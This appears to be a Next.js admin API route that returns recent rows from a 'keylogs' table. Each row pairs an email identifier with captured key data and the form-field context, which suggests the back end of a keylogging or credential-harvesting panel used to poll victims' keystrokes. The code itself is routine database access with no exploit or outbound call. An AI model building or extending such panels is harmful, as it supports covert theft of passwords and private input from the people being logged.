import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/db';
import { requireAdmin } from '@/lib/auth';

export async function GET(req: NextRequest) {
  const auth = requireAdmin(req);
  if (!auth) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

  const db = getDb();
  const { searchParams } = new URL(req.url);
  const since = parseInt(searchParams.get('since') || '0');

  const logs = db.prepare('SELECT id, email_identifier, key_data, field_context, created_at FROM keylogs WHERE id > ? ORDER BY id DESC LIMIT 50').all(since) as any[];

  const data = logs.map(l => ({
    ...l,
    keys_display: JSON.parse(l.key_data || '{}'),
    created_at: new Date(l.created_at + 'Z').toLocaleString('en-US', { month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true }),
  }));

  const maxId = data.length > 0 ? data[0].id : 0;

  return NextResponse.json({ status: 'ok', data, max_id: maxId });
}
